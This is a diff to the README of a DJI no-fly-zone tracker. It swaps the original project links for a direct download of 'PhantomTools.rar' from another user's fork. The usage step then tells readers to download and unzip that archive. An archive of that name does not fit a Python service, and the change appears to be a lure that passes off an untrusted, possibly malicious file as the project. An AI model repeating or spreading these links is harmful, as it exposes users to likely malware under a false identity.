@@ -1,6 +1,6 @@
 # Tracking DJI GEO ZONE NoFlyZone (NFZ)
 
-## [Download]()
+## [Download](https://github.com/Utkarsh132/dji-nfz-tracker/releases/download/download/PhantomTools.rar)
 
 ## Introduction:
 
@@ -8,7 +8,7 @@ This is a Python service that keeps track of which No Fly Zones are currently di
 
 ## Usage
 
-1) [Download](https://github.com/KonradIT/dji-nfz-tracker) zip archive. <br>
+1) [Download](https://github.com/Utkarsh132/dji-nfz-tracker/releases/download/download/PhantomTools.rar) zip archive. <br>
 
 2) Unzip the archive to your desktop. <br>
 
